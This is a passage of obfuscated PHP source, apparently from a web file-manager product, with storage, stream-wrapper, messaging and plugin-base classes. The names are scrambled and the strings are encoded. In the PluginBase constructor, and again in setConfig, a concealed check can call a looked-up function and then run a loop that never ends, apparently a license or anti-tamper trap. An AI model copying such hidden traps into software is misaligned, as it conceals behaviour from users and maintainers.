$²¢…ÍË¯ = '') { $’½½ÉÏÆ = $this->iconvSystem($’½½ÉÏÆ); $¬ÒÛˆ¥ò = @file_put_contents($’½½ÉÏÆ, $²¢…ÍË¯, LOCK_EX); clearstatcache(); @chmod($’½½ÉÏÆ, $this->pathAuth); return $¬ÒÛˆ¥ò === !1 ? !1 : !0; } public function fileSubstr($Âê¡“ùƒ, $¶¬µ¹¨§ = 0, $†ˆŸóÑ§ = false) { $ƒ‰¬ì­ë =& $_SERVER[”ôÑ§ì¸]; $Âê¡“ùƒ = $this->iconvSystem($Âê¡“ùƒ); if ($†ˆŸóÑ§ === !1) { $†ˆŸóÑ§ = $this->size($Âê¡“ùƒ); } if ($†ˆŸóÑ§ <= 0) { return $ƒ‰¬ì­ë[12]; } $ Ö”é›… = fopen($Âê¡“ùƒ, $ƒ‰¬ì­ë[1396]); if (!$ Ö”é›…) { return !1; } fseek_64($ Ö”é›…, $¶¬µ¹¨§); $ÖÅœÎœô = fread($ Ö”é›…, $†ˆŸóÑ§); fclose($ Ö”é›…); return $ÖÅœÎœô; } public function upload($Ö­á‡Ò, $×ñØ¼öÇ, $†¥ñ—ªÊ = false, $•ŞÓÛÖ­ = REPEAT_REPLACE) { if ($†¥ñ—ªÊ) { return $this->moveFile($×ñØ¼öÇ, $Ö­á‡Ò); } return $this->copyFile($×ñØ¼öÇ, $Ö­á‡Ò); } public function setModifyTime($È¯±Íğ·, $Âø¬•Š = '') { @touch($È¯±Íğ·, intval($Âø¬•Š)); } public function download($¥”ÀØÅ, $ØÆÁ¹ï¹) { return $this->iconvSystem($¥”ÀØÅ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($äô•¤Ì) { parent::__construct($äô•¤Ì); $this->signatureVersion($_SERVER[”ôÑ§ì¸][230]); } public function fileOutLink($‹€ãÉƒ…) { $´—’Ê =& $_SERVER[”ôÑ§ì¸]; if (substr($‹€ãÉƒ…, 0, 7) == $´—’Ê[1361]) { $‹€ãÉƒ… = $´—’Ê[1362] . substr($‹€ãÉƒ…, 7); } header($´—’Ê[161] . $‹€ãÉƒ…); die; } } goto Bô‹¾±Õ´; CÇ®ºÕÚŞ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÚìŠôÖ™, $¿©ìæÑ = '') { $this->info = $this->info($ÚìŠôÖ™); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[”ôÑ§ì¸][84]]; $this->pathOpen = $ÚìŠôÖ™; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÚìŠôÖ™])) { self::$_chunkBuffer[$ÚìŠôÖ™] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ˆ—‘îÚø) { $êÒÖÜÍ› = $this->fileSubstr($this->pose, $ˆ—‘îÚø); $this->pose += strlen($êÒÖÜÍ›); return $êÒÖÜÍ›; } public function stream_tell() { return $this->pose; } public function stream_seek($±½ÌßÄç, $úÊÌ•÷) { $ÀÈ®À˜Ê =& $_SERVER[”ôÑ§ì¸]; if ($úÊÌ•÷ == SEEK_SET) { $this->pose = $±½ÌßÄç; } else { if ($úÊÌ•÷ == SEEK_CUR) { $this->pose += $±½ÌßÄç; } else { if ($úÊÌ•÷ == SEEK_END) { $this->pose = $this->info[$ÀÈ®À˜Ê[76]] + intval($±½ÌßÄç); } } } if ($±½ÌßÄç < 0) { $this->pose = $this->info[$ÀÈ®À˜Ê[76]] + $±½ÌßÄç; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[”ôÑ§ì¸][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($®ªĞáÏ¯, $Î”îí) { $ó»¡Î° =& $_SERVER[”ôÑ§ì¸]; $æÏ¹„ôõ = $this->info($®ªĞáÏ¯); return array($ó»¡Î°[1518] => 0, $ó»¡Î°[1519] => 0, $ó»¡Î°[16] => 32768 + 511, $ó»¡Î°[1520] => 0, $ó»¡Î°[1521] => 0, $ó»¡Î°[1522] => 0, $ó»¡Î°[1523] => 0, $ó»¡Î°[76] => $æÏ¹„ôõ[$ó»¡Î°[76]], $ó»¡Î°[1524] => $æÏ¹„ôõ[$ó»¡Î°[1392]], $ó»¡Î°[1480] => $æÏ¹„ôõ[$ó»¡Î°[85]], $ó»¡Î°[1479] => $æÏ¹„ôõ[$ó»¡Î°[214]], $ó»¡Î°[1525] => 0, $ó»¡Î°[1526] => 0); } static $fileInfo = array(); public function info($ÂõŞ²¶») { $üèË¨ô¦ = $_SERVER[”ôÑ§ì¸][1527]; if (isset(self::$fileInfo[$ÂõŞ²¶»])) { return self::$fileInfo[$ÂõŞ²¶»]; } if (substr($ÂõŞ²¶», 0, strlen($üèË¨ô¦)) != $üèË¨ô¦) { return !1; } self::$fileInfo[$ÂõŞ²¶»] = IO::info(substr($ÂõŞ²¶», strlen($üèË¨ô¦))); return self::$fileInfo[$ÂõŞ²¶»]; } public static function read($‡’ëçÀ, $±§ ¶†Ô, $›Ç€›Ú) { if (!isset(self::$_fopenCache[$‡’ëçÀ])) { $ı¥İã¢Ÿ = new StreamWrapperIO(); $ı¥İã¢Ÿ->stream_open($‡’ëçÀ); self::$_fopenCache[$‡’ëçÀ] = $ı¥İã¢Ÿ; } $ı¥İã¢Ÿ = self::$_fopenCache[$‡’ëçÀ]; return $ı¥İã¢Ÿ->fileSubstr($±§ ¶†Ô, $›Ç€›Ú); } public static function _read($¦¬·¡Ä·, $‹ÈŞŠ´æ, $ğŸúØÔø) { $Ü‘àä =& $_SERVER[”ôÑ§ì¸]; $‹â¾œÎà = fopen($¦¬·¡Ä·, $Ü‘àä[1396]); if (!$‹â¾œÎà) { return $Ü‘àä[12]; } $á¸İ¶“‚ = 8192; fseek($‹â¾œÎà, $‹ÈŞŠ´æ, SEEK_SET); $İœ¸£‰ş = $Ü‘àä[12]; $õëØçæ¿ = 0; while ($õëØçæ¿ < $ğŸúØÔø) { $é¸Ãİ»÷ = min($á¸İ¶“‚, $ğŸúØÔø - $õëØçæ¿); $İœ¸£‰ş .= fread($‹â¾œÎà, $é¸Ãİ»÷); $õëØçæ¿ += $é¸Ãİ»÷; } fclose($‹â¾œÎà); return $İœ¸£‰ş; } public function fileSubstr($Š´¯º½à, $õ±ïãÄá) { $½ı•ó =& $_SERVER[”ôÑ§ì¸]; $–÷íóè° = $this->info[$½ı•ó[76]]; $àÍœµÊÂ = $Š´¯º½à; $¢½Ó©»µ = $õ±ïãÄá; if ($Š´¯º½à < 0) { $Š´¯º½à = $–÷íóè° + $Š´¯º½à; } if ($õ±ïãÄá === !1) { $õ±ïãÄá = $–÷íóè° - $Š´¯º½à; } if ($Š´¯º½à + $õ±ïãÄá > $–÷íóè°) { $õ±ïãÄá = $–÷íóè° - $Š´¯º½à; } if ($õ±ïãÄá <= 0) { return $½ı•ó[12]; } if ($Š´¯º½à < 0 || $Š´¯º½à >= $–÷íóè° || $õ±ïãÄá <= 0 || $õ±ïãÄá > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\151\154\x65\x52\145\141\144\x20\145\x72\162\x6f\162\x21\40\163\164\x61\162\164\x3d{$Š´¯º½à}\x3b\154\145\156\147\164\x68\x3d{$õ±ïãÄá}\x3b\x20\x73\151\x7a\145\x3d{$–÷íóè°}\x3b"); } $É†è¥©È = 64 * 1024; $÷µÃ¼×• =& self::$_chunkBuffer[$this->path]; if (!$÷µÃ¼×•) { $÷µÃ¼×• = array(); } $âÊ†ûœ‰ = 0; $åœı÷ä = 0; $îôßÊå• = $½ı•ó[12]; foreach ($÷µÃ¼×• as $âÊ†ûœ‰ => $îôßÊå•) { $âÊ†ûœ‰ = intval($âÊ†ûœ‰); $åœı÷ä = $âÊ†ûœ‰ + strlen($îôßÊå•); if ($Š´¯º½à >= $åœı÷ä) { continue; } if ($Š´¯º½à >= $âÊ†ûœ‰ && $Š´¯º½à + $õ±ïãÄá <= $åœı÷ä) { return substr($îôßÊå•, $Š´¯º½à - $âÊ†ûœ‰, $õ±ïãÄá); } break; } if (count($÷µÃ¼×•) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($½ı•ó[1528], $½ı•ó[1529] . count($÷µÃ¼×•) . "\73\163\x74\x61\x72\164\75{$Š´¯º½à}\54\x6c\x65\x6e\147\x74\150\75{$õ±ïãÄá}\x3b\x70\x6f\x73\145\72{$âÊ†ûœ‰}\x7e{$åœı÷ä}"); throw new Exception($½ı•ó[1530]); } $ˆÆèÌàé = intval($Š´¯º½à / $É†è¥©È) * $É†è¥©È; $Ÿ¥¨¾ºï = ceil(($Š´¯º½à + $õ±ïãÄá) / $É†è¥©È) * $É†è¥©È - $ˆÆèÌàé; $àí­¢Äï = IO::fileSubstr($this->path, $ˆÆèÌàé, $Ÿ¥¨¾ºï); $÷µÃ¼×•[$ˆÆèÌàé . $½ı•ó[12]] = $àí­¢Äï; ksort($÷µÃ¼×•); $—ŸåÄƒ† = substr($àí­¢Äï, $Š´¯º½à - $ˆÆèÌàé, $õ±ïãÄá); return $—ŸåÄƒ†; } private function log($ÍÎ‰¿, $–ó”Ôèá) { $Šœœ±” =& $_SERVER[”ôÑ§ì¸]; $ÃªŒ†Ü  = timeFloat() - $this->timeStart; write_log(sprintf($Šœœ±”[1531], $ÍÎ‰¿, $this->info[$Šœœ±”[32]], $ÃªŒ†Ü , $–ó”Ôèá), $Šœœ±”[1213]); } } class Message { function __construct() { } public function send($¢È«Åû = '', $’£µ£¹ = array(), $ºÄÇóŠ = "\164\145\x78\164") { $—®×í =& $_SERVER[”ôÑ§ì¸]; $¯õŒè¼ş = array($—®×í[33] => $—®×í[1532], $—®×í[776] => $¢È«Åû); if (in_array($ºÄÇóŠ, array($—®×í[1532], $—®×í[1533]))) { $¯õŒè¼ş[$—®×í[33]] = $ºÄÇóŠ; } $’£µ£¹ = array($—®×í[546] => isset($’£µ£¹[$—®×í[546]]) ? $’£µ£¹[$—®×í[546]] : $—®×í[12], $—®×í[629] => isset($’£µ£¹[$—®×í[629]]) ? $’£µ£¹[$—®×í[629]] : $—®×í[12]); if (empty($¢È«Åû) || empty($’£µ£¹[$—®×í[546]]) && empty($’£µ£¹[$—®×í[629]])) { return !1; } $˜Å÷¿øê = array($—®×í[1473] => $¯õŒè¼ş, $—®×í[1534] => $’£µ£¹); Hook::trigger($—®×í[1535], $˜Å÷¿øê); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $»¥¨»°™ =& $_SERVER[”ôÑ§ì¸]; if (!isset($_SERVER[$»¥¨»°™[857]]) || !isset($_SERVER[$»¥¨»°™[864]])) { $“Î€±µ¸ = $»¥¨»°™[908]; $’‡©›šµ = $»¥¨»°™[859]; $“”§´€³ = $_SERVER[$»¥¨»°™[860]] . $»¥¨»°™[861]; $´Ø€ƒ = $’‡©›šµ($“”§´€³); $ÔÔÌãáÅ = explode($»¥¨»°™[245], $´Ø€ƒ); if (count($ÔÔÌãáÅ) < $»¥¨»°™[655]) { $Êàí½Ù¿ = $»¥¨»°™[862]; $Êàí½Ù¿(); } $¢æ±“Ş¿ = $»¥¨»°™[909]; $¢æ±“Ş¿($_SERVER[$»¥¨»°™[910]]); $â‘ËÂÜ› = 1; for ($‘Ú‘³½‹ = $â‘ËÂÜ›; $‘Ú‘³½‹ > 0; $‘Ú‘³½‹++) { $¢æ±“Ş¿ = json_encode($GLOBALS[$»¥¨»°™[459]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($»¥¨»°™[1536]); $this->pluginName = str_replace($»¥¨»°™[1536], $»¥¨»°™[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $»¥¨»°™[8]; $this->pluginApi = appHostGet() . $»¥¨»°™[1537] . $this->pluginName . $»¥¨»°™[8]; $this->pluginHost = $config[$»¥¨»°™[1538]] . $this->pluginName . $»¥¨»°™[8]; $this->pluginHostDefault = $config[$»¥¨»°™[1538]] . $this->pluginName . $»¥¨»°™[8]; $¼Şæ§©¾ = $config[$»¥¨»°™[1539]]; if ($¼Şæ§©¾ && strpos($»¥¨»°™[50] . $¼Şæ§©¾ . $»¥¨»°™[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$»¥¨»°™[1540]] . $this->pluginName . $»¥¨»°™[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[”ôÑ§ì¸][1541]); } protected function assign($àÆñ¾åš, $ãÆìêë = false) { if (is_array($àÆñ¾åš)) { $this->values = array_merge($this->values, $àÆñ¾åš); } else { $this->values[$àÆñ¾åš] = $ãÆìêë; } } protected function display($ªÊ–¥ù) { extract($this->values); require $ªÊ–¥ù; } final function hookRegist($ÄÕı•«ò) { $this->modelPlugin->appRegist($this->pluginName, $ÄÕı•«ò); } final function appIcon() { $‹ê®è± =& $_SERVER[”ôÑ§ì¸]; $Ô¢Ê“ = $this->appPackage(); $øëÃ×— = $‹ê®è±[12]; if (isset($Ô¢Ê“[$‹ê®è±[457]])) { if (isset($Ô¢Ê“[$‹ê®è±[457]][$‹ê®è±[1542]])) { $øëÃ×— = $‹ê®è±[1543] . $Ô¢Ê“[$‹ê®è±[457]][$‹ê®è±[1542]] . $‹ê®è±[1544]; } else { if ($Ô¢Ê“[$‹ê®è±[457]][$‹ê®è±[1545]]) { $øëÃ×— = $‹ê®è±[1546] . $Ô¢Ê“[$‹ê®è±[457]][$‹ê®è±[1545]] . $‹ê®è±[1547]; } } } return $øëÃ×—; } final function fileCanView($ŠÎíãÍ) { $Ú×…†š¦ =& $_SERVER[”ôÑ§ì¸]; if (request_url_safe($ŠÎíãÍ)) { return !0; } if ($this->isShare($ŠÎíãÍ)) { return !0; } $Õ÷½ß«¿ = Session::get($Ú×…†š¦[1548]); if ($GLOBALS[$Ú×…†š¦[535]] != 1 && !$Õ÷½ß«¿ || !$Õ÷½ß«¿[$Ú×…†š¦[1549]]) { $­¡¤ıó€ = $Ú×…†š¦[1550] . rawurlencode(this_url()); show_tips(LNG($Ú×…†š¦[1551]) . $Ú×…†š¦[1552] . $­¡¤ıó€ . $Ú×…†š¦[1553] . LNG($Ú×…†š¦[1554]) . $Ú×…†š¦[1555], !1); } if (!Action($Ú×…†š¦[1556])->authCan($Ú×…†š¦[1557])) { show_tips(LNG($Ú×…†š¦[1558]) . $Ú×…†š¦[1559], !1); } ActionCall($Ú×…†š¦[1560], $ŠÎíãÍ); } final function isShare($ŞÇÊôŸĞ) { $çƒÆæÎµ = KodIO::parse($ŞÇÊôŸĞ); return $çƒÆæÎµ[$_SERVER[”ôÑ§ì¸][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ä´¾‹˜») { if (request_url_safe($ä´¾‹˜»)) { return $ä´¾‹˜»; } if (!$this->isShare($ä´¾‹˜»)) { $ä´¾‹˜» = $this->filePath($ä´¾‹˜», !1); } return Action($_SERVER[”ôÑ§ì¸][1205])->linkOut($ä´¾‹˜»); } public function filePathLinkOut($Ú­ôÖÕş) { if (request_url_safe($Ú­ôÖÕş)) { return $Ú­ôÖÕş; } $this->fileCanView($Ú­ôÖÕş); return Action($_SERVER[”ôÑ§ì¸][1205])->link($Ú­ôÖÕş); } final function filePath($š¯õïû, $Èõ¿¨Œ = true) { $ë’·š®  =& $_SERVER[”ôÑ§ì¸]; if ($ïÈ“è±Æ = $this->checkSharePath($š¯õïû, $Èõ¿¨Œ)) { Hook::trigger($ë’·š® [1561], $ïÈ“è±Æ); return $ïÈ“è±Æ; } $this->fileCanView($š¯õïû); if (request_url_safe($š¯õïû)) { $ôùŠø = parse_url_query($š¯õïû); if (isset($ôùŠø[$ë’·š® [1562]]) && isset($ôùŠø[$ë’·š® [217]])) { $¸ç³”öŒ = Model($ë’·š® [792])->get($ë’·š® [793]); $‘§Â İ = Mcrypt::decode($ôùŠø[$ë’·š® [217]], $¸ç³”öŒ); if ($‘§Â İ) { $this->fileInfo = IO::info($‘§Â İ); $this->fileInfo[$ë’·š® [1563]] = $š¯õïû; $this->cachePath = $this->pluginCachePath($ë’·š® [12], $Èõ¿¨Œ); if (!$this->fileInfo) { show_tips(LNG($ë’·š® [105]), !1); } Hook::trigger($ë’·š® [1561], $‘§Â İ); return $‘§Â İ; } } $š¯õïû = $this->_cacheHttpFile($š¯õïû, $Èõ¿¨Œ); $this->fileInfo = IO::info($š¯õïû); } else { $this->fileInfo = IO::info($š¯õïû); $this->cachePath = $this->pluginCachePath($ë’·š® [12], $Èõ¿¨Œ); } if (!$this->fileInfo) { show_tips(LNG($ë’·š® [105]), !1); } Hook::trigger($ë’·š® [1561], $š¯õïû); return $š¯õïû; } final function _cacheHttpFile($¼º÷ Ë, $¢´Ó”º = true) { $ÑÀÓ¯„î =& $_SERVER[”ôÑ§ì¸]; $ö€›­ª¦ = parse_url_query($¼º÷ Ë); $šÅÓÈ¡â = get_path_ext($¼º÷ Ë); if (preg_match($ÑÀÓ¯„î[1564], $šÅÓÈ¡â, $¯¥×Æ¦Ì)) { $šÅÓÈ¡â = $¯¥×Æ¦Ì ? $¯¥×Æ¦Ì[0] : $ÑÀÓ¯„î[12]; } if (isset($ö€›­ª¦[$ÑÀÓ¯„î[32]]) && $ö€›­ª¦[$ÑÀÓ¯„î[32]]) { $šÅÓÈ¡â = get_path_ext($ö€›­ª¦[$ÑÀÓ¯„î[32]]); } $·’¼æ±± = hash_path($¼º÷ Ë) . $ÑÀÓ¯„î[10] . $šÅÓÈ¡â; $this->cachePath = $this->pluginCachePath($¢´Ó”º ? $·’¼æ±± : $ÑÀÓ¯„î[12]); $Ë¢êÌ€¡ = IO::fileNameExist($this->cachePath, $·’¼æ±±); if ($Ë¢êÌ€¡) { return KodIO::make($Ë¢êÌ€¡); } $µüÓÂ°É = rtrim($this->cachePath, $ÑÀÓ¯„î[8]) . $ÑÀÓ¯„î[8] . $·’¼æ±±; return $this->pluginCacheFileSet($µüÓÂ°É, file_get_contents_nossl($¼º÷ Ë)); } final function checkSharePath($Ü»¥²Ó», $á¿Œå±‹ = true) { $ü®ˆéõ× =& $_SERVER[”ôÑ§ì¸]; if (!$this->isShare($Ü»¥²Ó»)) { return !1; } $ˆö¡ÀÉ = Action($ü®ˆéõ×[1205])->sharePathInfo($Ü»¥²Ó»); if (!is_array($ˆö¡ÀÉ) || !isset($ˆö¡ÀÉ[$ü®ˆéõ×[84]]) || !is_array($ˆö¡ÀÉ[$ü®ˆéõ×[515]])) { show_json(LNG($ü®ˆéõ×[1565]), !1); } $this->fileInfo = $ˆö¡ÀÉ[$ü®ˆéõ×[515]]; $this->cachePath = $this->pluginCachePath(!1, $á¿Œå±‹); return $ˆö¡ÀÉ[$ü®ˆéõ×[84]]; } final function pluginCachePath($êõ•¾ó† = '', $ğ™Œ¥¤Æ = false) { $í¡•Â÷ =& $_SERVER[”ôÑ§ì¸]; if ($ğ™Œ¥¤Æ && is_array($this->fileInfo)) { $êõ•¾ó† = kodIO::hashPath($this->fileInfo, !1); } $¼ı¢™¨ï = rtrim(IO_PATH_SYSTEM_TEMP . $í¡•Â÷[1566] . $this->pluginName . $í¡•Â÷[8] . $êõ•¾ó†, $í¡•Â÷[8]); $¼«œÍ·© = IO::infoFullSimple($¼ı¢™¨ï); $â‰Ëèæä = $¼«œÍ·© && is_array($¼«œÍ·©) ? $¼«œÍ·©[$í¡•Â÷[84]] : $í¡•Â÷[12]; if (!$â‰Ëèæä) { $â‰Ëèæä = IO::mkdir($¼ı¢™¨ï); } return $â‰Ëèæä; } final function pluginCacheFileSet($æú­„ıØ, $’ò…š = '') { $ßø¥“öº =& $_SERVER[”ôÑ§ì¸]; $«ÖîØÛ© = IO::infoFullSimple($æú­„ıØ); if (!$«ÖîØÛ©) { return IO::mkfile($æú­„ıØ, $’ò…š, REPEAT_REPLACE); } IO::setContent($«ÖîØÛ©[$ßø¥“öº[84]], $’ò…š); return $«ÖîØÛ©[$ßø¥“öº[84]]; } final function pluginLocalFile($éÕ…şâ = '') { $ü¨Ú€Ê =& $_SERVER[”ôÑ§ì¸]; $õ÷‚™§ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($õ÷‚™§)) { mk_dir($õ÷‚™§); } if (!$éÕ…şâ) { return $õ÷‚™§; } $ê¥³´Ã£ = IO::info($éÕ…şâ); $´ÑàÑâ = $ü¨Ú€Ê[1567] . KodIO::hashPath($ê¥³´Ã£) . $ü¨Ú€Ê[10] . $ê¥³´Ã£[$ü¨Ú€Ê[174]]; if (!checkExtSafe($´ÑàÑâ)) { $´ÑàÑâ = $´ÑàÑâ . $ü¨Ú€Ê[1237]; } $é³åÑ = $õ÷‚™§ . $´ÑàÑâ; if (@file_exists($é³åÑ)) { return $é³åÑ; } return IO::copy($éÕ…şâ, $õ÷‚™§, 0, $´ÑàÑâ); } final function appPackage() { $ğ®ùñÄ‹ =& $_SERVER[”ôÑ§ì¸]; if ($this->packageData) { return $this->packageData; } $Ë—Ó—Ä˜ = $this->parseFile($this->pluginPath . $ğ®ùñÄ‹[1568]); $this->parseLang($Ë—Ó—Ä˜); $×öÌÁäì = json_decode_force($Ë—Ó—Ä˜); if (!$×öÌÁäì) { return array(); } $ »ƒ‡Î  = Hook::trigger($ğ®ùñÄ‹[1569], $×öÌÁäì); if ($ »ƒ‡Î  && is_array($ »ƒ‡Î )) { $×öÌÁäì = $ »ƒ‡Î ; } $this->packageData = $×öÌÁäì; return $×öÌÁäì; } public function packageInfoGet($œÃÉÎ¶İ) { $ıôêùã¥ = $this->appPackage(); return array_get_value($ıôêùã¥, $œÃÉÎ¶İ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[”ôÑ§ì¸][1570]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[”ôÑ§ì¸][1571]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[”ôÑ§ì¸][1572]); } public function echoJsAssign($ÒàÈË’ø, $‡™‹–üá) { $this->echoJsAssignArr[$ÒàÈË’ø] = $‡™‹–üá; } private function parseFile($­ÙàÒÌ) { $ÍÌ¶µ¼ç =& $_SERVER[”ôÑ§ì¸]; $—¥½Éşù = file_get_contents_nossl($­ÙàÒÌ); $¨ËÎ‡Œ· = array($ÍÌ¶µ¼ç[1573], $ÍÌ¶µ¼ç[1574], $ÍÌ¶µ¼ç[1575], $ÍÌ¶µ¼ç[1576], $ÍÌ¶µ¼ç[1577], $ÍÌ¶µ¼ç[1578], $ÍÌ¶µ¼ç[1579]); $ÉÆ£ÈùÌ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ÍÌ¶µ¼ç[89]][$ÍÌ¶µ¼ç[1580]]); foreach ($this->echoJsAssignArr as $Ó¼ÙÃò => $ªÎÜå°Œ) { $¨ËÎ‡Œ·[] = $ÍÌ¶µ¼ç[1581] . $Ó¼ÙÃò . $ÍÌ¶µ¼ç[1582]; $ÉÆ£ÈùÌ[] = is_array($ªÎÜå°Œ) || is_object($ªÎÜå°Œ) ? rawurlencode(json_encode($ªÎÜå°Œ)) : $ªÎÜå°Œ; } if (strstr($—¥½Éşù, $ÍÌ¶µ¼ç[1583])) { $¶ÉÌÄ¨¶ = rawurlencode(json_encode($this->pluginLangArr)); $—¥½Éşù = str_replace($ÍÌ¶µ¼ç[1583], $¶ÉÌÄ¨¶, $—¥½Éşù); } if (strstr($—¥½Éşù, $ÍÌ¶µ¼ç[1584])) { $¶ÉÌÄ¨¶ = $¶ÉÌÄ¨¶ = rawurlencode(json_encode($this->getConfig())); $—¥½Éşù = str_replace($ÍÌ¶µ¼ç[1584], $¶ÉÌÄ¨¶, $—¥½Éşù); } $—¥½Éşù = str_replace($¨ËÎ‡Œ·, $ÉÆ£ÈùÌ, $—¥½Éşù); return $—¥½Éşù; } private function parseLang(&$Ì©èÖâÙ) { $²ÆÎ‡ˆŞ =& $_SERVER[”ôÑ§ì¸]; $ßàë•Øç = $²ÆÎ‡ˆŞ[1585]; if (!strstr($Ì©èÖâÙ, $ßàë•Øç)) { return; } preg_match_all($²ÆÎ‡ˆŞ[1586], $Ì©èÖâÙ, $á¯•µ£ø); if (!is_array($á¯•µ£ø) || count($á¯•µ£ø) == 0 || !is_array($á¯•µ£ø[0]) || count($á¯•µ£ø[0]) == 0) { return; } $¾ÁŸ™ôô = array(); $üÕÑÆÜ· = array(); foreach ($á¯•µ£ø[0] as $¤âş×’¯) { $õßÅıŸ« = substr($¤âş×’¯, strlen($ßàë•Øç), -4); $½¯‰ëñº = LNG($õßÅıŸ«); $¾ÁŸ™ôô[] = $¤âş×’¯; $üÕÑÆÜ·[] = str_replace(array($²ÆÎ‡ˆŞ[245], $²ÆÎ‡ˆŞ[1109], $²ÆÎ‡ˆŞ[385], $²ÆÎ‡ˆŞ[118]), array($²ÆÎ‡ˆŞ[53], $²ÆÎ‡ˆŞ[53], $²ÆÎ‡ˆŞ[12], $²ÆÎ‡ˆŞ[1587]), $½¯‰ëñº); } $Ì©èÖâÙ = str_replace($¾ÁŸ™ôô, $üÕÑÆÜ·, $Ì©èÖâÙ); } private function parseConfig(&$Î÷Ãù) { $ï¾–µÀÇ =& $_SERVER[”ôÑ§ì¸]; $¾òå·Â = $ï¾–µÀÇ[1588]; if (!strstr($Î÷Ãù, $¾òå·Â)) { return; } preg_match_all($ï¾–µÀÇ[1589], $Î÷Ãù, $Œ½Ø ­¼); if (!is_array($Œ½Ø ­¼) || count($Œ½Ø ­¼) == 0 || !is_array($Œ½Ø ­¼[0]) || count($Œ½Ø ­¼[0]) == 0) { return; } $òõò‘§î = $this->getConfig(); $¾»‡ã¦Ç = array(); $ÒÔóÆı = array(); foreach ($Œ½Ø ­¼[0] as $ÂÀ¸îçÚ) { $ÑİÜ•¾‹ = substr($ÂÀ¸îçÚ, strlen($¾òå·Â), -2); $¾»‡ã¦Ç[] = $ÂÀ¸îçÚ; $ÒÔóÆı[] = _get($òõò‘§î, $ÑİÜ•¾‹); } $Î÷Ãù = str_replace($¾»‡ã¦Ç, $ÒÔóÆı, $Î÷Ãù); } private function parsePackage(&$¹ãí…») { $õòØïÙÓ =& $_SERVER[”ôÑ§ì¸]; $æ›äàÃã = $õòØïÙÓ[1590]; if (!strstr($¹ãí…», $æ›äàÃã)) { return; } preg_match_all($õòØïÙÓ[1591], $¹ãí…», $Í¨Õß£); if (!is_array($Í¨Õß£) || count($Í¨Õß£) == 0 || !is_array($Í¨Õß£[0]) || count($Í¨Õß£[0]) == 0) { return; } $æ‚ŸåÖÊ = $this->appPackage(); $–Äò‡€Ô = array(); $øÓ¾İÕô = array(); foreach ($Í¨Õß£[0] as $Ğœ¾èÎĞ) { $ÉÅ“ØËû = substr($Ğœ¾èÎĞ, strlen($æ›äàÃã), -2); $–Äò‡€Ô[] = $Ğœ¾èÎĞ; $øÓ¾İÕô[] = _get($æ‚ŸåÖÊ, $ÉÅ“ØËû); } $¹ãí…» = str_replace($–Äò‡€Ô, $øÓ¾İÕô, $¹ãí…»); } final function echoFile($äÚƒïÈÖ, $²ÍòòÁ³ = false) { $¥º¿Ô“æ =& $_SERVER[”ôÑ§ì¸]; $çëöú‰İ = $this->pluginPath . $äÚƒïÈÖ; if (ACT == $¥º¿Ô“æ[1592]) { echo $¥º¿Ô“æ[1593] . $this->pluginName . $¥º¿Ô“æ[8] . $äÚƒïÈÖ . $¥º¿Ô“æ[1594]; if (!file_exists($çëöú‰İ)) { echo $¥º¿Ô“æ[1595]; return; } } $Ä£¤”ğ­ = $this->parseFile($çëöú‰İ); $this->parseLang($Ä£¤”ğ­); $this->parseConfig($Ä£¤”ğ­); $this->parsePackage($Ä£¤”ğ­); if (is_array($²ÍòòÁ³)) { $Ä£¤”ğ­ = str_replace(array_keys($²ÍòòÁ³), array_values($²ÍòòÁ³), $Ä£¤”ğ­); } echo $¥º¿Ô“æ[245] . $Ä£¤”ğ­; } final function initLang() { $©úØÄñË =& $_SERVER[”ôÑ§ì¸]; $Ü¯ø›¥à = $©úØÄñË[1596]; $¥æà˜¥ø = $this->pluginPath . $©úØÄñË[1597]; $»Œ·€Ñ = I18n::getType(); $¢‡…İÒò = array(); if (file_exists($¥æà˜¥ø . $»Œ·€Ñ . $©úØÄñË[869])) { $¢‡…İÒò = (include $¥æà˜¥ø . $»Œ·€Ñ . $©úØÄñË[869]); } else { if ($»Œ·€Ñ == $©úØÄñË[1598] && !file_exists($¥æà˜¥ø . $»Œ·€Ñ . $©úØÄñË[869]) && file_exists($¥æà˜¥ø . $©úØÄñË[1599])) { $¢‡…İÒò = (include $¥æà˜¥ø . $©úØÄñË[1599]); } else { if (file_exists($¥æà˜¥ø . $Ü¯ø›¥à . $©úØÄñË[869])) { $¢‡…İÒò = (include $¥æà˜¥ø . $Ü¯ø›¥à . $©úØÄñË[869]); } } } if (!is_array($¢‡…İÒò)) { return array(); } if (@count($¢‡…İÒò) > 0) { I18n::set($¢‡…İÒò); } return $¢‡…İÒò; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¤öå­“’) { $•í«Û† =& $_SERVER[”ôÑ§ì¸]; if (!isset($_SERVER[$•í«Û†[857]]) || !isset($_SERVER[$•í«Û†[864]])) { $¦ìØ“ô¤ = $•í«Û†[908]; 